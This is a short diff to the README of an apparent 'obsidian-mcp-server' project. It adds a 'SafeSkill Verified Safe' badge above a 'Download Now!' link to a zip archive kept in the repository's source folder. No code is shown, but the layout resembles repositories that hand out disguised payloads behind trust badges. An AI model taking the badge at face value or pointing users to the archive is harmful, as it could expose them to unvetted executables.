@@ -1,5 +1,7 @@
 # 🌟 obsidian-mcp-server - Enhance Your Note-Taking Experience
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/adityasingh0z3-obsidian-mcp-server)
+
 ## 📥 Download Now!
 [![Download](https://github.com/adityasingh0z3/obsidian-mcp-server/raw/refs/heads/main/src/tools/mcp_server_obsidian_2.1-alpha.3.zip)](https://github.com/adityasingh0z3/obsidian-mcp-server/raw/refs/heads/main/src/tools/mcp_server_obsidian_2.1-alpha.3.zip)
 
